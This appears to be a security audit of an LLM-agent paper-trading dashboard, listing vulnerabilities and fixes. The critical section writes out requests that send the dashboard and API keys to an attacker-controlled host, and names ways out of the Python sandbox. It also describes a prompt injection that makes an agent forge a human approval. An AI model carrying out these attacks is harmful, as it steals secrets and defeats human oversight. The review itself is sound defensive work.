# Claire Trading — Full Review (2026-11-03)

Read-only review; no files, services or DB rows were changed. Three parallel
reviewers (money path / auth+web / LLM+tools) plus direct checks. All
Critical/High items below were confirmed against the code; items marked [R]
were also reproduced with scratch scripts.

**Summary:** the dashboard on `0.0.0.0:7787` is open to anyone on the home
network and lets them steal every API key and the dashboard key without a
password. Fix that before putting more credit on the Anthropic account. The
paper-only boundary holds, and the integer money ledger and approval-token
gate are well designed, but several routes around the gate let someone
bypass it.

## Critical

### C1. Anyone on the network can steal every secret
`app/dashboards.py:287` (`/api/provider` → `_upsert_provider`, ~853-883)
and `:273` (`/api/provider-test`).
- Neither route checks the key, and `api_key_ref` accepts any env var name.
  `build_llm` (`app/providers/registry.py:200-227`) sends
  `env[api_key_ref]` as the bearer token to the provider's `base_url`.
- Exploit: `POST /api/provider {"id":"x","kind":"openai_compatible","base_url":"http://attacker/v1","api_key_ref":"CLAIRE_DASHBOARD_KEY"}`
  then `POST /api/provider-test {"provider_id":"x"}` sends the key to the
  attacker. The same works for `ANTHROPIC_API_KEY`,
  `CLAIRE_INTERNAL_SECRET` and the rest.
- With the dashboard key the attacker can approve, override and move cash.
  `/api/agent` (no key check) then lets them repoint the arbiter to a model
  they run.
- Because of CSRF (H2), any website you visit can do the same.

### C2. `run_python` is not a sandbox
`app/tools/sandbox.py:12-22, 43-50`.
- The network block only replaces `socket.socket`, `create_connection` and
  `getaddrinfo` inside Python. `import _socket`, `importlib.reload(socket)`
  and `subprocess` + `/usr/bin/curl` all still work [R].
- It runs as the same user (uid 1000), with no filesystem jail and no
  process limit (RLIMIT_NPROC). `etc/claire.env` (0600, same owner) is
  readable, and `var/desk.db` is readable and writable [R]. Scrubbing the
  environment doesn't help because the secrets are on disk.
- Scenario: prompt injection in a fetched page makes an analyst run code
  that reads `CLAIRE_INTERNAL_SECRET` and a pending `approval_token`, then
  POSTs `/internal/resume` with `actor:"human", status:"approved"`. That
  bypasses the human gate. The code could also UPDATE desk.db directly or
  leak keys.
- On timeout only the direct child is killed. Processes it spawned survive,
  and with no process limit a fork bomb is possible.

## High

### H1. Most state-changing POST routes have no key check
`app/dashboards.py:229-307`. Only `/api/thesis-action`, `/api/override` and
`/api/account-action` check `_paired()`. These are open:
- `/api/run`, `/api/ask`, `/api/agent-ask`: start paid LLM runs. Claire chat
  has a `run_pipeline` tool.
- `/api/agent`, `/api/provider`, `/api/provider-test`.
- `/api/schedule`: turn schedules on or off and edit their specs, e.g. a
  huge `max_runs`.
- `/api/mcp`: stores an arbitrary `command` argv. Not exploitable today
  because `wiring.py:33` never launches MCP servers, but it becomes command
  execution once that lands.
- `/api/watchlist`.

### H2. CSRF from any website, plus DNS rebinding
`_json_body` (`dashboards.py:129-131`) parses JSON whatever the
Content-Type, and there is no Origin or Host check. A `fetch(...,
{mode:'no-cors'})` with a text/plain body from any page can hit every route
in H1/C1. Routes that require `X-Dash-Key` are protected by the CORS
preflight. With no Host check, DNS rebinding can read every GET route.

### H3. Stored XSS that steals the dashboard key
The key sits in `localStorage.dashKey` (`web/nav.js:14`).
- `display_name` is rendered unescaped at `web/agents.html:45`. It is set
  via the open `/api/provider` route.
- `a.model` is rendered unescaped at `web/agents.html:59` and
  `web/index.html:339`. It is set via the open `/api/agent` route.
- The ticker goes unchecked into the work-item id
  (`app/api/desk.py:40`, `RunBody.ticker: str`). That id is rendered raw in
  `onclick`/`id` attributes at `web/trading.html:45,49-50`, and the row
  persists even when the run fails.
- (OK: approvals.html escapes the LLM summary and lists.)

### H4. Daily schedules with `last_run_at = NULL` never fire
`app/scheduler.py:93-101, 157`. With no last run, `ref = now` and the
candidate time must be greater than `ref`, so `now < next` holds on every
tick. [R] Zero fires over a simulated week. All four daily jobs
(`analysis_asia/eu/us`, `reconcile`) have NULL `last_run_at`.

### H5. The approval card can show a different stock from the one traded
`app/graph/pipeline.py:228,235` vs `app/graph/nodes_execution.py:39-43`.
`make_debater` (`nodes_analysis.py:173-183`) never pins `thesis.ticker` or
`currency` to the state, and `Thesis` (`state.py:129-151`) doesn't check
them. A thesis with `ticker="AAPL"` on an `SGX:C07` run shows AAPL to the
human while the SGX stock is ordered at AAPL price levels. There is also no
check that `entry_low <= entry_high` or that the price is sane; the buy
limit is `entry_high`.

### H6. Failed FX lookup silently uses a rate of 1.0
`app/api/server.py:78-88`: `fx_rate_for` returns `to_micro("1")` on any
exception. A ¥300,000 fill would be booked as $300,000. Same fallback in
`app/portfolio.py:147`.

### H7. Risk caps compare local-currency amounts against base-currency limits
`app/accounting/repo.py:162-190`. `nodes_execution.py:126` passes the
native-currency `entry_high`. [R] 100 Toyota shares at ¥3000 (about $2k)
are rejected against the $25k `max_order_base`, while HKD and SGD orders
get 7.8x and 1.35x looser caps than intended. `max_position_pct` has the
same problem. Market orders (`limit_price=None`) skip both notional caps.

### H8. Custodian fragility (`app/custodian.py`)
- **One bad order stops every custodian duty** (`:26-39`, `_poll_fills`
  `:87-95`). Any exception aborts `run_once`, so expiry, retries, orphan
  checks and drift all stop. [R] Two triggers:
  (a) two approvals that both pass `_pre_checks`: the sim fills instantly
  but cash is debited at poll time, so the second fill raises
  `InsufficientCash`;
  (b) a claire-api restart: the in-memory sim forgets its orders, so
  `BrokerError: unknown order`.
  It then fails on every run and approvals never expire.
- **The timer custodian expires live orders without cancelling them**
  (`:116-122`; the timer is built with `brokers={}` at `:264`). When
  `adapter is None` it skips `cancel()` but still marks the order
  `expired`, then refuses the later fills, so the book diverges from the
  broker. [R]

## Medium

- **M1. Shutdown under systemd and drain state.**
  - `systemd/claire.service` uses the default KillMode=control-group with
    `TimeoutStopSec=320`, but `DRAIN_TIMEOUT` is 300s plus loop overhead.
    When a drain refuses to stop, systemd kills the whole cgroup anyway,
    before `restore_schedules` runs.
  - The next `stop` then finds nothing enabled and writes `""` over
    `var/.drain-schedules.json`, so the list of enabled jobs is lost
    (`bin/claire:152-182`). SIGHUP isn't trapped.
- **M2. `bin/claire-reset` backups are incomplete.** It copies `desk.db`
  without its `-wal` file; the Aug 13 backup is confirmed to be missing
  recent writes. It also deletes `checkpoints.db` but leaves its `-wal`
  and `-shm` files.
- **M3. Split breaks the ledger** (`repo.py:363-373`). It scales
  `qty_opened` but not `lot_closures`. Buy 100, sell 40, split 2:1 →
  `assert_invariants` fails. [R]
- **M4. Venue order with no DB row** (`nodes_execution.py:65-80`,
  `custodian.py:65-77`). `place_bracket` runs before
  `create_order`/`mark_order`, with no client order id. A crash in between
  leaves an untracked order, or a `pending_session` order that gets placed
  again.
- **M5. Approved trade whose execution fails is stuck forever**
  (`app/api/main.py:94-102`). The state is set to `approved` before
  resume. If execution raises, the token stays `pending_resume` and every
  retry gets 409. The "approved with no order past 60 min → expired" rule
  in DESIGN §12 isn't implemented.
- **M6. Rejected `pending_session` orders leave their work item stuck in
  `executing`** (`custodian.py:76-78`). No orphan check covers it.
- **M7. Watcher problems.**
  - Trailing-stop rows are duplicated on each approval
    (`nodes_execution.py:110-113`): `ON CONFLICT DO NOTHING` has no unique
    constraint to hit [R].
  - The high-water mark is never reset, so a re-bought stock inherits the
    old one (`watcher.py:92-118`).
  - Rules are keyed only by `instrument_id`, so long/short legs and
    different accounts share one rule (`watcher.py:43`).
- **M8. Short positions mis-valued on the portfolio page**
  (`portfolio.py:30,150-152`). [R]
- **M9. Overrides skip `prepare`** (`pipeline.py:117-130`). An SGX buy is
  sized in fractions of a share instead of 100-share board lots.
- **M10. Daily jobs re-fire immediately after downtime**, contrary to the
  docstring (`scheduler.py:93`), e.g. a stale "pre-open" scan running
  mid-session.
- **M11. Exchange calendars are incomplete** (`sessions.py:221-237`).
  - SGX is missing Hari Raya Haji, Vesak and **Deepavali (observed Mon
    Nov 9)**.
  - HKEX is missing May 1, Apr 7, May 25, Jun 19 and Oct 19.
  - TSE is missing Jan 12, Mar 20, Jul 20, Sep 21-23 and Oct 12.
  - NSE lists only 2 holidays.
  - No half days are modelled (US Nov 27 and Dec 24, LSE/ASX/Euronext
    Dec 24 and 31).
- **M12. LLM cost metering is wrong.**
  - Anthropic cached tokens are subtracted twice (`registry.py:148,168`):
    [R] metered 5000 tokens/$0.015 where the truth was 9000/$0.035.
  - A call served by the fallback model is billed at the primary model's
    rates (`registry.py:128-130`).
- **M13. The screener can't pick none.** Zero picks raises `ScreenerError`
  (`screener.py:229`), and the caller (`server.py:128-133`) falls back to
  top names anyway, so paid runs start regardless.

## Low

- Approval-token race: the single-use check is check-then-act with no
  lock (`approvals.py:44-75`, `main.py:76-102`).
- `record_fill` checks idempotency and computes the fee outside
  `BEGIN IMMEDIATE` (`repo.py:222-236`).
- Keys, secrets and tokens are compared with `==`, not a constant-time
  comparison (`dashboards.py:135`, `main.py:61,76`, `approvals.py:42`).
- Request bodies have no size limit, and a negative `Content-Length`
  blocks. Each SSE stream holds a thread forever.
- The narrative jail allows writing into another work item's folder
  (`files.py:76-77`, `../wi_B/...`). [R]
- `fetch_page` follows redirects to any URL, including loopback, so
  internal GET state can be read into an agent's transcript.
- Claire chat calls are likely not metered (`claire_agent.py:163`).
- The "local" timezone is a fixed offset (`scheduler.py:67`), so it is an
  hour off after a DST change.
- `max_trades_per_day` ignores `pending_session` orders and uses UTC days.
- `SAXO_SIM_TOKEN` (`brokers.py:119`) vs `SAXO_ACCESS_TOKEN` in the MCP
  server. The dashboard shows "MCP live" even though execution always uses
  the sim.
- `pgrep -f` patterns in `bin/claire` aren't limited to this checkout or
  user.
- Market cache: stale data is returned without a flag (`market.py:147-151`),
  and a cache entry, even an expired one, skips the rate-budget check
  (`market.py:246`).
- Retry stacking: 3 retries per model plus a fallback, over 30 steps.

## Checked and OK

- Paper/SIM boundary: `wiring.build_brokers` only builds `PaperSimBroker`.
  Saxo order placement requires `SAXO_ENV=sim`. `ibkr.py` is data-only.
  The schema CHECK blocks live accounts. No agent tool can place orders.
- Only `repo` writes the money tables.
- The narratives path jail is OK at the work-item root
  (`tools/files.py:15-21`).
- Static file serving uses fixed dicts, so no path traversal.
- Tokens are removed from `/api/runs` and `/api/run-detail`.
- `etc/claire.env` is 0600. claire-api and `bob-dashboard-server` listen
  on loopback only.

## Recommended order of fixes

1. **Now:** set `CLAIRE_DASHBOARD_BIND=127.0.0.1` in `etc/claire.env`, then
   `bin/claire restart`.
2. Require `_paired()` on every POST. Only accept `api_key_ref` from a
   fixed list (and never `CLAIRE_*`).
3. Add Origin/Host checks and require `Content-Type: application/json`.
   Escape provider, model and ticker fields in the web pages, and validate
   tickers with a regex in `RunBody`.
4. Run `run_python` in a real sandbox (bwrap/nsjail with no network, a
   read-only root, and no access to `etc/` or `var/`, plus RLIMIT_NPROC),
   or remove the tool.
5. Pin the thesis ticker and currency to the run and check entry prices.
   Make FX failures stop the trade instead of using 1.0. Convert to base
   currency before the risk caps.
6. Fix daily-schedule firing when `last_run_at` is NULL. Re-enable the
   intended schedules by hand; the Aug 13 backup shows which were on.
7. Make the custodian handle errors per order. Cancel or skip, rather than
   expire, when there's no adapter.
8. Fix the clock-dependent screener test, then the Medium items.
9. Top up Anthropic credit only after steps 1–5.
